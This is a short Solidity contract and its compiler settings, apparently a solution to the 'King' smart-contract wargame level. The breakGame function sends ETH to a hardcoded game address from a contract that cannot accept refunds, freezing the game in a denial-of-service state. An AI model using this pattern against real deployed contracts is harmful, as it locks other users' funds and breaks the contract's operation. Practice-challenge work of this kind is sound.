// contracts/King.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
  address admin;

  constructor() {
    admin = msg.sender;
  }

  function breakGame() public payable {
    require(admin == msg.sender, "unauthorized");

    require(msg.value > 0, "send eth");

    address payable KingGameAddress;
    KingGameAddress = payable(0xfFBf448A0F279c376A4D0AE7D46F0EDDC0eEb732);
    (bool success, ) = KingGameAddress.call{value:msg.value, gas:50000}("");
    require(success, "Transfer failed.");
  }
}

{
  "optimizer": {
    "enabled": true,
    "runs": 200
  },
  "outputSelection": {
    "*": {
      "*": [
        "evm.bytecode",
        "evm.deployedBytecode",
        "abi"
      ]
    }
  },
  "libraries": {}
}